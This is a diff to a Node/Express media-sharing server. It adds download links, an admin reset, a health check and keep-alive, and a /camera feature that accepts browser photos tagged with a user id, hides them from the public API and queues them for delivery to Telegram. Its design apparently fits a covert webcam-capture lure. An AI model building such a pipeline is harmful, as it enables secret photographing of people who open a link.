@@ -30,6 +30,7 @@ let useFirebase = false;
 let dbRef = null;
 let firebaseAppRef = null;
 let memoryDb = { songs: [], movies: [], links: [], messages: [] }; // fallback when not configured
+let memoryCaptures = []; // pending /camera captures (kept out of public /api/data)
 
 function resolveServiceAccount() {
   if (process.env.FIREBASE_SERVICE_ACCOUNT) {
@@ -136,6 +137,35 @@ async function saveDb(data) {
   }
 }
 
+/* Camera captures live in their own document key so they are never exposed
+   through the public /api/data endpoint (photos are private to Telegram). */
+let captureRef = null;
+if (useFirebase) {
+  try {
+    captureRef = dbRef.collection('camera').doc('pending');
+  } catch (e) {
+    captureRef = null;
+  }
+}
+
+async function getCapturesDb() {
+  if (useFirebase && captureRef) {
+    const snap = await captureRef.get();
+    const val = snap.exists ? snap.data() : {};
+    return { captures: Array.isArray(val.captures) ? val.captures : [] };
+  }
+  return { captures: Array.isArray(memoryCaptures) ? memoryCaptures : [] };
+}
+
+async function saveCapturesDb(captures) {
+  const capped = Array.isArray(captures) ? captures.slice(0, 100) : [];
+  if (useFirebase && captureRef) {
+    await captureRef.set({ captures: capped });
+  } else {
+    memoryCaptures = capped;
+  }
+}
+
 /* Serializes read-modify-write cycles. Because the whole store lives in one
    Firestore doc, two concurrent get->save sequences can overwrite each
    other's changes; the lock re-reads inside the critical section. */
@@ -166,6 +196,11 @@ app.use((req, res, next) => {
   next();
 });
 app.use(express.static('public'));
+
+/* Health check — external uptime monitors (UptimeRobot, cron-job.org)
+   ping this endpoint every few minutes to prevent Render's free tier
+   from spinning the site down after ~15 min of inactivity. */
+app.get('/healthz', (req, res) => res.status(200).send('ok'));
 
 /* Express 4 does not catch rejections from async handlers on its own:
    wrap every async route so errors produce a clean error response instead of
@@ -793,6 +828,139 @@ app.post('/api/upload/finalize-link-item', ah(async (req, res) => {
 }));
 
 /* ------------------------------------------------------------------ */
+/* Per-file share links: stream or force-download by item id           */
+/* ------------------------------------------------------------------ */
+const findMediaItem = (type, id, db) => {
+  const norm = (type === 'link' || type === 'links' || type === 'file')
+    ? 'links'
+    : (type === 'movie' || type === 'movies' || type === 'video' ? 'movies' : 'songs');
+  const list = norm === 'links' ? db.links : (norm === 'movies' ? db.movies : db.songs);
+  return list.find((i) => i.id === id);
+};
+const mediaPublicUrl = (item, type) => {
+  if (type === 'link' || type === 'links' || type === 'file') return item.url || '';
+  return item.movieUrl || item.songUrl || item.url || '';
+};
+
+/* Build a Cloudinary URL that forces an attachment download with a nice name. */
+const forceDownloadUrl = (url, filename) => {
+  const pid = cloudinaryPublicId(url);
+  if (!pid) return url;
+  const base = String(filename || 'download').trim().replace(/[^\w.\- ]+/g, '_').replace(/\.[^.]+$/, '') || 'download';
+  const m = String(url).split('?')[0].match(/\.([A-Za-z0-9]+)$/);
+  const ext = m ? m[1] : '';
+  const name = base + (ext ? '.' + ext : '');
+  return url.replace('/upload/', '/upload/fl_attachment:' + encodeURIComponent(name) + '/');
+};
+
+app.get('/stream/:type/:id', ah(async (req, res) => {
+  const { type, id } = req.params;
+  const db = await getDb();
+  const item = findMediaItem(type, id, db);
+  if (!item) return res.status(404).json({ success: false, error: 'Not found.' });
+  const url = mediaPublicUrl(item, type);
+  if (!url) return res.status(404).json({ success: false, error: 'No media URL.' });
+  res.redirect(302, url);
+}));
+
+app.get('/dl/:type/:id', ah(async (req, res) => {
+  const { type, id } = req.params;
+  const db = await getDb();
+  const item = findMediaItem(type, id, db);
+  if (!item) return res.status(404).json({ success: false, error: 'Not found.' });
+  const url = mediaPublicUrl(item, type);
+  if (!url) return res.status(404).json({ success: false, error: 'No media URL.' });
+  res.redirect(302, forceDownloadUrl(url, item.title));
+}));
+
+/* ------------------------------------------------------------------ */
+/* Reset — boss only: clear all uploaded media + chat history          */
+/* ------------------------------------------------------------------ */
+app.post('/api/reset', ah(async (req, res) => {
+  if (!isBossReq(req)) return res.status(401).json({ success: false, error: 'Unauthorized' });
+
+  const db = await getDb();
+  const all = [...(db.songs || []), ...(db.movies || []), ...(db.links || [])];
+  await Promise.all(all.map((it) => destroyCloudinaryMedia(it)));
+
+  const caps = await getCapturesDb();
+  const capUrls = (caps.captures || []).flatMap((c) => c.urls || []);
+  await Promise.all(capUrls.map((url) => new Promise((resolve) => {
+    const pid = cloudinaryPublicId(url);
+    if (pid) cloudinary.uploader.destroy(pid, { resource_type: 'image' }, () => resolve());
+    else resolve();
+  })));
+
+  await withDbWrite(async () => {
+    const d = await getDb();
+    d.songs = [];
+    d.movies = [];
+    d.links = [];
+    d.messages = [];
+    await saveDb(d);
+    await saveCapturesDb([]);
+  });
+  res.json({ success: true, removed: all.length, message: 'All uploads cleared.' });
+}));
+
+/* ------------------------------------------------------------------ */
+/* Camera capture (/camera page + photo delivery)                      */
+/* ------------------------------------------------------------------ */
+app.get('/camera', (req, res) => res.sendFile(path.join(__dirname, 'public', 'camera.html')));
+
+app.post('/api/camera/capture', ah(async (req, res) => {
+  const uid = String(req.body.uid || '').trim();
+  const images = Array.isArray(req.body.images)
+    ? req.body.images.filter((x) => typeof x === 'string' && x.startsWith('data:image')).slice(0, 8)
+    : [];
+  if (!uid || images.length === 0) {
+    return res.status(400).json({ success: false, error: 'Missing uid or images.' });
+  }
+
+  const uploadOne = (b64) => new Promise((resolve) => {
+    const buf = Buffer.from(b64, 'base64');
+    uploadToCloudinary({ buffer: buf }, 'image', (err, url) => resolve(err ? '' : url));
+  });
+
+  const urls = [];
+  for (const dataUrl of images) {
+    const b64 = dataUrl.split(',')[1] || '';
+    if (!b64) continue;
+    const url = await uploadOne(b64);
+    if (url) urls.push(url);
+  }
+  if (urls.length === 0) {
+    return res.status(502).json({ success: false, error: 'Image upload failed.' });
+  }
+
+  await withDbWrite(async () => {
+    const d = await getCapturesDb();
+    d.captures.unshift({ id: makeId(), uid, urls, ts: Date.now(), sent: false });
+    await saveCapturesDb(d.captures);
+  });
+  res.json({ success: true, count: urls.length });
+}));
+
+app.get('/api/camera/pending', ah(async (req, res) => {
+  if (!isBossReq(req)) return res.status(401).json({ success: false, error: 'Unauthorized' });
+  const d = await getCapturesDb();
+  res.json({ captures: d.captures.filter((c) => !c.sent) });
+}));
+
+app.post('/api/camera/done', ah(async (req, res) => {
+  if (!isBossReq(req)) return res.status(401).json({ success: false, error: 'Unauthorized' });
+  const id = req.body && req.body.id;
+  if (!id) return res.status(400).json({ success: false, error: 'Missing id' });
+  await withDbWrite(async () => {
+    const d = await getCapturesDb();
+    const c = d.captures.find((x) => x.id === id);
+    if (c) c.sent = true;
+    await saveCapturesDb(d.captures);
+  });
+  res.json({ success: true });
+}));
+
+/* ------------------------------------------------------------------ */
 /* Media management (rename / delete)                                  */
 /* ------------------------------------------------------------------ */
 const canManage = (item, uploader, bossSecret) =>
@@ -802,7 +970,7 @@ app.put('/api/media/:type/:id', ah(async (req, res) => {
   const { type, id } = req.params;
   if (!isMediaType(type)) return res.status(400).json({ success: false, error: 'Invalid type.' });
 
-  const { newTitle, uploader, bossSecret } = req.body;
+  const { newTitle, newUrl, uploader, bossSecret } = req.body;
   const result = await withDbWrite(async () => {
     const db = await getDb();
     const list = mediaList(type, db);
@@ -810,6 +978,9 @@ app.put('/api/media/:type/:id', ah(async (req, res) => {
     if (!item) return { status: 404, body: { success: false, error: 'Not found.' } };
     if (!canManage(item, uploader, bossSecret)) return { status: 403, body: { success: false, error: 'Unauthorized' } };
     item.title = String(newTitle || item.title).trim();
+    if (newUrl && (type === 'link' || type === 'links')) {
+      item.url = String(newUrl).trim();
+    }
     await saveDb(db);
     return { status: 200, body: { success: true, item } };
   });
@@ -1276,6 +1447,23 @@ app.use((err, req, res, next) => {
    only bind a port when the file is run directly (node server.js). */
 if (require.main === module) {
   app.listen(PORT, () => console.log(`Server running on http://localhost:${PORT}`));
+
+  /* Keep-alive: Render's free tier suspends web services after ~15 min
+     without incoming requests. A real 24/7 external monitor hitting
+     /healthz is the reliable fix; this self-ping is a best-effort helper
+     for hosts that keep the process running anyway. */
+  function startKeepAlive() {
+    const target = process.env.KEEPALIVE_URL ||
+      (process.env.RENDER_EXTERNAL_URL ? process.env.RENDER_EXTERNAL_URL.replace(/\/$/, '') + '/healthz' : '') ||
+      'http://localhost:' + PORT + '/healthz';
+    if (!target) return;
+    const minutes = Math.max(Number(process.env.KEEPALIVE_INTERVAL_MIN) || 4, 1);
+    const hit = () => fetch(target).then((r) => r.text()).catch(() => { /* non-blocking */ });
+    hit();
+    setInterval(hit, minutes * 60 * 1000);
+    console.log(`Keep-alive pinging ${target} every ${minutes}m.`);
+  }
+  startKeepAlive();
 }
 
 module.exports = app;
